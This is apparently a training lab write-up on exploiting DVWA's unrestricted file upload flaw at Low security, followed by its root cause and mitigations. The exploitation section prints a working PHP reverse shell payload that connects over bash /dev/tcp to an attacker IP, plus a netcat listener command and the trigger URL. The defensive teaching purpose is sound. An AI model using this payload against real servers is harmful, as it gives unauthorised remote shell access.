FILE UPLOAD VULNERABILITY ASSESSMENT REPORT

Target Application: DVWA (Damn Vulnerable Web Application)
Vulnerability Type: Unrestricted File Upload
Security Level:
Severity: Critical
Testing Environment: Educational Lab

INTRODUCTION

This report documents the exploitation of an Unrestricted File Upload vulnerability in DVWA at the Low security level.

File upload vulnerabilities occur when a web application allows users to upload files without proper validation or security controls. Attackers can abuse this functionality to upload malicious scripts and gain remote code execution on the target server.

The assessment demonstrates how unrestricted uploads can lead to full system compromise.

OBJECTIVE

The objective of this assessment was to:

Identify insecure file upload functionality
Upload executable PHP files
Achieve remote code execution
Demonstrate reverse shell access
TOOLS USED
Web Browser
DVWA
PHP Reverse Shell
Netcat
HTTP Requests
VULNERABILITY DESCRIPTION

The DVWA File Upload module at the Low security level allows users to upload files without implementing proper security checks.

The application does not verify:

File extensions
MIME types
File content
Executable scripts
Upload restrictions

Because of these missing protections, attackers can upload malicious PHP files directly to the web server.

EXPLOITATION PROCESS

Step 1: Create Malicious PHP File

A PHP reverse shell payload was created.

Payload Used:

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.1/1234 0>&1'"); ?>

Note:
The IP address must be replaced with the attacker machine's IP address.

Step 2: Save Payload

The file was saved as:

shell.php

Step 3: Upload the File

The malicious PHP file was uploaded through the DVWA upload form.

The application accepted the upload successfully.

OBSERVED RESULT

After upload, DVWA displayed the uploaded file location:

hackable/uploads/shell.php

This confirmed that the file was stored inside a web-accessible directory.

START NETCAT LISTENER

A Netcat listener was started on the attacker machine:

nc -lnvp 1234

The listener waited for incoming reverse shell connections.

EXECUTE THE UPLOADED FILE

The uploaded PHP file was accessed directly through the browser:

http://127.0.0.1/DVWA/hackable/uploads/shell.php

RESULT

Upon execution, the target server initiated a reverse shell connection back to the attacker machine.

An interactive shell session was successfully obtained.

This confirmed that remote code execution was possible through the unrestricted file upload vulnerability.

ROOT CAUSE

The vulnerability exists because the application fails to implement secure file upload controls.

Missing protections include:

File extension validation
MIME type verification
File content inspection
Execution restrictions
Upload directory protections

The application trusts user-uploaded files without validating whether they contain executable code.

SECURITY IMPACT

An attacker exploiting this vulnerability may be able to:

Execute arbitrary server-side code
Gain remote shell access
Upload web shells and backdoors
Access sensitive files
Escalate privileges
Fully compromise the target server

Because uploaded files execute directly on the server, the impact is considered Critical.

RECOMMENDATIONS

The following mitigations are recommended:

Restrict Allowed File Types

Only allow necessary file extensions such as:

.jpg
.png
.pdf
Validate MIME Types

Verify uploaded file content using server-side validation.

Rename Uploaded Files

Generate random file names to prevent predictable access.

Store Uploads Outside Web Root

Uploaded files should not be directly accessible through the browser.

Disable Script Execution

Prevent execution of uploaded files within upload directories.

Example Apache configuration:

php_admin_flag engine off

Implement File Content Scanning

Scan uploads for malicious content and executable code.

Apply Least Privilege

Restrict web server permissions to minimize damage if exploitation occurs.

CONCLUSION

The assessment confirmed that the DVWA application at the Low security level is critically vulnerable to unrestricted file upload attacks.

Because the application accepts executable PHP files without validation and stores them in a web-accessible location, attackers can achieve remote code execution and potentially gain full control of the server.
